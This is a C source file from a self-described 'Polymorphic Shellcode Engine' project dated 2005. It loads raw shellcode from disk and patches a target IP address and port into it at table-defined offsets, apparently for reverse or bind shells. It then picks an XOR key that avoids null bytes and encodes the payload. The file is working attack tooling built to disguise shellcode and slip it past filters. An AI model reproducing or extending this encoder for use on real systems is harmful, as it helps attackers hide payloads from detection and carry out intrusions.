/*
** load_sh.c for Polymorphic Shellcode Engine project
** 
** Made by eee
** 
** Started on  Tue Apr 12 16:56:57 2005 eee
** Last update Mon Apr 18 14:09:14 2005 eee
*/

#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <pse.h>

extern t_sh	gl_sh[];

void		crypt_sh(t_env *env)
{
  int		i;
  unsigned char	key;

  key = env->key; 
  for (i = 0; i < env->size; i++)
    {
      env->shellcode[i] ^= key++;
      if (env->shellcode[i] == 0)
	{
	  printf("Invalid key, sorry it's an evil bug\n");
	  exit(1);
	}
    }
}

void	check_key(t_env *env, char *desc)
{
  char	key;
  char	save;
  char	tmp;
  int	i;

  printf("\n[-] Recherche d'une cle pour -> %s\n", desc);
  key = (random() % 255) + 1;
  save = key;
  while (1)
  {
    tmp = key;
    for (i = 0; i < env->size; i++, tmp++)
      {
	if (tmp == env->shellcode[i])
	  break;
      }
    if (i != env->size)
      {
	key++;
	if (key == save)
	  {
	    printf("invalid shellcode\n");
	    exit(1);
	  }
	if (key == 0)
	  key++;
      }
    else
      break;
  }
  env->key = key;
  printf("key = %d\n", env->key);
}

void	patch_sh(t_env *env)
{
  char	*ptr;
  if (gl_sh[env->sh].off_port != -1)
    {
      ptr = env->shellcode;
      ptr += gl_sh[env->sh].off_port;
      memcpy (ptr, &env->port, 2);
    }
  if (gl_sh[env->sh].off_ip != -1)
    {
      ptr = env->shellcode;
      ptr += gl_sh[env->sh].off_ip;
      memcpy (ptr, &env->ip, 4);
    }
}

void		load_sh(t_env *env, char *sh)
{
  int		fd;
  struct stat	st;

  fd = xopen(sh, O_RDWR, 0);
  if ((fstat(fd, &st)) != 0)
    {
      perror("fstat");
      exit(1);
    }
  if ((env->shellcode = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE,
			MAP_PRIVATE, fd, 0)) == MAP_FAILED)
  {
      perror("mmap");
      exit(1);
    }
  close(fd);
  env->size = st.st_size;
  patch_sh(env);
}
